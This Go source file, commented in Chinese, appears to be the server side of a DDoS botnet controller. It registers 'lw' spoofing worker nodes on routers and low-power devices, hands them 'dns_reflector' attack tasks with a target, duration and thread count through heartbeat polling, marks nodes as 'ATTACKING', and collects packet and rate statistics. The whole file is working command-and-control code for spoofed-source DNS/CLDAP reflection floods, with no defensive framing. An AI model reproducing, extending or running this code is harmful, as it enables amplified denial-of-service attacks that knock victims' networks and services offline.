package controller

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"
	"time"
)

// ============================================================
// 轻量伪造 Worker（blackout-lw，Rust）接入：
// 路由器/低性能设备的 UDP 伪源反射节点。
//   - 认证复用 authHTTP（worker token / per-worker token）
//   - 节点 Tag "lw" 标记；只派发 dns_reflector 任务
//   - 心跳即任务轮询（HTTP/1.1 + JSON，替代 gRPC）
// ============================================================

// isLWNodeLocked 判断节点是否为轻量伪造节点（Tags 含 "lw"）。
// 调用方必须已持有 c.mu（读/写锁）——内部不加锁，
// 避免"写锁内 RLock"导致 RWMutex 死锁。
func isLWNodeLocked(n *NodeInfo) bool {
	if n == nil {
		return false
	}
	for _, t := range n.Tags {
		if t == "lw" {
			return true
		}
	}
	return false
}

// isLWNode 锁外版本（自行加锁）
func (c *Ctrl) isLWNode(id string) bool {
	c.mu.RLock()
	n, ok := c.nodes[id]
	c.mu.RUnlock()
	return ok && isLWNodeLocked(n)
}

// isReflectorTaskMethod 判断任务是否反射类（lw 节点只参与反射任务）
func isReflectorTaskMethod(method string) bool {
	switch method {
	case "vse_reflector", "dns_reflector", "cldap_reflector":
		return true
	}
	return false
}

// lwTask 心跳响应的任务 JSON（与 blackout-lw Rust 端 TaskMsg 对齐）。
// Targets 留空：lw worker 自行拉取反射器池。
type lwTask struct {
	TaskID   string `json:"task_id"`
	Target   string `json:"target"`
	Method   string `json:"method"`
	Duration int32  `json:"duration"`
	Threads  int32  `json:"threads"`
}

// handleLWRegister POST /api/lw/register
// body: {"token":"...","platform":"linux","arch":"mipsel"}
// 返回: {"ok":true,"node_id":"lw-1-2-3-4"}
func (c *Ctrl) handleLWRegister(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Token    string `json:"token"`
		Platform string `json:"platform"`
		Arch     string `json:"arch"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"invalid json"}`, 400)
		return
	}
	// 认证：Bearer token（worker token / per-worker token / admin）
	if !c.workerTokenEnabled(req.Token) && req.Token != c.workerToken && req.Token != c.adminToken {
		writeJSON(w, map[string]string{"error": "unauthorized"})
		return
	}

	// 对端 IP（HTTP 层）
	peerIP := ""
	if host, _, err := net.SplitHostPort(r.RemoteAddr); err == nil {
		peerIP = host
	} else {
		peerIP = r.RemoteAddr
	}

	// 节点 ID：lw-<ip-dashed>（同 IP 重注册复用）
	baseID := "lw-" + strings.ReplaceAll(strings.Trim(peerIP, "[]"), ".", "-")

	c.regMu.Lock()
	defer c.regMu.Unlock()

	c.mu.Lock()
	assignedID := baseID
	// 复用同 IP 的既有 lw 条目（离线或同 IP 在线）
	if existing, ok := c.nodes[baseID]; ok && existing.IP == peerIP {
		existing.LastHeartbeat = time.Now()
		existing.Status = "READY"
		existing.CpuPercent = 0
		existing.Platform = req.Platform + "-" + req.Arch
		existing.IsWindows = false
		c.mu.Unlock()
		log.Printf("[lw] %s re-registered (platform=%s)", baseID, existing.Platform)
		writeJSON(w, map[string]interface{}{"ok": true, "node_id": assignedID})
		return
	}
	// 冲突则递增后缀
	suffix := 1
	for {
		if _, ok := c.nodes[assignedID]; !ok {
			break
		}
		suffix++
		assignedID = fmt.Sprintf("%s-%d", baseID, suffix)
	}
	node := &NodeInfo{
		WorkerID:    assignedID,
		IP:          peerIP,
		Status:      "READY",
		LastHeartbeat: time.Now(),
		IsWindows:   false,
		Platform:    req.Platform + "-" + req.Arch,
		// lw 节点的存在意义即伪造：能力确定
		CanSpoof:    true,
		SpoofTested: true,
		Tags:        []string{"lw"},
	}
	c.nodes[assignedID] = node
	c.mu.Unlock()

	c.persistNodes()
	c.broadcastWS("nodes", c.listNodesForBroadcast())
	log.Printf("[lw] %s registered (platform=%s ip=%s)", assignedID, node.Platform, peerIP)
	writeJSON(w, map[string]interface{}{"ok": true, "node_id": assignedID})
}

// handleLWHeartbeat POST /api/lw/heartbeat
// body: {"token":"...","node_id":"..."}
// 返回: {"task":{...}|null, "kick":bool}
// 心跳即任务轮询：只派发 dns_reflector 任务（lw 的能力范围）。
func (c *Ctrl) handleLWHeartbeat(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Token  string `json:"token"`
		NodeID string `json:"node_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"invalid json"}`, 400)
		return
	}
	if !c.workerTokenEnabled(req.Token) && req.Token != c.workerToken && req.Token != c.adminToken {
		writeJSON(w, map[string]string{"error": "unauthorized"})
		return
	}

	c.mu.Lock()
	node, ok := c.nodes[req.NodeID]
	kicked := c.kicked[req.NodeID]
	if ok {
		node.LastHeartbeat = time.Now()
		if node.Status == "" || node.Status == "OFFLINE" {
			node.Status = "READY"
		}
	}
	c.mu.Unlock()

	if kicked {
		writeJSON(w, map[string]interface{}{"task": nil, "kick": true})
		return
	}
	if !ok {
		writeJSON(w, map[string]string{"error": "unknown node"})
		return
	}

	// 派发：从 pendingIDs 找第一个可派发的 dns_reflector 任务
	var task *lwTask
	c.mu.Lock()
	rem := c.pendingIDs[:0]
	for i, tid := range c.pendingIDs {
		t := c.tasks[tid]
		if t == nil || t.Status != "pending" || t.Method != "dns_reflector" {
			continue
		}
		if t.NextRunAt.After(time.Now()) {
			rem = append(rem, tid)
			continue
		}
		if len(t.SelectedWorkers) > 0 && !containsStr(t.SelectedWorkers, req.NodeID) {
			rem = append(rem, tid)
			continue
		}
		if c.workerHasTask(t, req.NodeID) {
			rem = append(rem, tid)
			continue
		}
		// 派发给本 lw 节点
		t.Workers[req.NodeID] = &TaskStats{WorkerID: req.NodeID}
		if c.onlineWorkersAllAssigned(t) {
			t.Status = "running"
			t.StartTime = time.Now()
		} else {
			rem = append(rem, tid)
		}
		task = &lwTask{
			TaskID:   t.TaskID,
			Target:   t.Target,
			Method:   t.Method,
			Duration: t.Duration,
			Threads:  t.Threads,
		}
		rem = append(rem, c.pendingIDs[i+1:]...)
		break
	}
	c.pendingIDs = rem
	if task != nil {
		if n, nok := c.nodes[req.NodeID]; nok {
			n.Status = "ATTACKING"
		}
	}
	c.mu.Unlock()

	if task != nil {
		log.Printf("[lw] %s assigned task %s (%s)", req.NodeID, task.TaskID, task.Method)
		c.broadcastWS("nodes", c.listNodesForBroadcast())
	}
	writeJSON(w, map[string]interface{}{"task": task, "kick": false})
}

// handleLWReport POST /api/lw/report
// body: {"token":"...","node_id":"...","task_id":"...","packets":N,"bytes":N,"errors":N,"pps":N,"finished":bool}
//   - finished=true（或字段缺省，兼容 v0.1.1 旧协议）：任务完成上报。
//     更新统计并标记该节点 Finished，全部节点完成后任务置 completed。
//   - finished=false：周期统计上报（仅更新统计，不触发完成判定；
//     task_id 可为空，空 id 静默接受，不产生 404 噪音）。
func (c *Ctrl) handleLWReport(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Token   string `json:"token"`
		NodeID  string `json:"node_id"`
		TaskID  string `json:"task_id"`
		Packets uint64 `json:"packets"`
		Bytes   uint64 `json:"bytes"`
		Errors  uint64 `json:"errors"`
		PPS     uint64 `json:"pps"`
		// 指针区分缺省：nil = 旧协议，按完成上报处理
		Finished *bool `json:"finished"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"invalid json"}`, 400)
		return
	}
	if !c.workerTokenEnabled(req.Token) && req.Token != c.workerToken && req.Token != c.adminToken {
		writeJSON(w, map[string]string{"error": "unauthorized"})
		return
	}

	// 周期统计上报：只更新进行中任务的统计字段，不置 Finished
	if req.Finished != nil && !*req.Finished {
		if req.TaskID != "" {
			c.mu.Lock()
			if task, ok := c.tasks[req.TaskID]; ok && task.Workers != nil {
				if st, assigned := task.Workers[req.NodeID]; assigned {
					st.PacketsSent = req.Packets
					st.BytesSent = req.Bytes
					st.Errors = req.Errors
					st.CurrentPPS = req.PPS
				}
			}
			c.mu.Unlock()
		}
		writeJSON(w, map[string]bool{"ok": true})
		return
	}

	c.mu.Lock()
	task, ok := c.tasks[req.TaskID]
	if !ok || task.Workers == nil {
		c.mu.Unlock()
		writeJSON(w, map[string]string{"error": "task not found"})
		return
	}
	if _, assigned := task.Workers[req.NodeID]; !assigned {
		c.mu.Unlock()
		writeJSON(w, map[string]string{"error": "worker not assigned to task"})
		return
	}
	task.Workers[req.NodeID] = &TaskStats{
		WorkerID:    req.NodeID,
		PacketsSent: req.Packets,
		BytesSent:   req.Bytes,
		Errors:      req.Errors,
		CurrentPPS:  req.PPS,
		Finished:    true,
	}
	if task.Status == "cancelling" {
		// 取消流程中：与 Go worker 的 ReportStats 对齐——已停止的节点记为
		// 已确认取消，全部确认后由 finishCancellingTask 收尾（重派或完成）。
		if task.CancelAcks == nil {
			task.CancelAcks = make(map[string]bool)
		}
		task.CancelAcks[req.NodeID] = true
		if c.taskFullyCancelled(task) {
			c.finishCancellingTask(task)
		}
	} else if task.Status == "running" {
		allDone := true
		for _, st := range task.Workers {
			if !st.Finished {
				allDone = false
				break
			}
		}
		if allDone {
			task.Status = "completed"
			task.FinishedAt = time.Now()
			entry := c.buildTaskLog(task)
			go c.logTaskComplete(entry)
			wids := taskWorkerIDs(task)
			c.resetNodeStatusesLocked(wids...)
			log.Printf("[lw] task %s completed (all workers)", req.TaskID)
		}
	}
	c.mu.Unlock()
	c.broadcastWS("task_update", c.getTaskInfo(req.TaskID))
	writeJSON(w, map[string]bool{"ok": true})
}
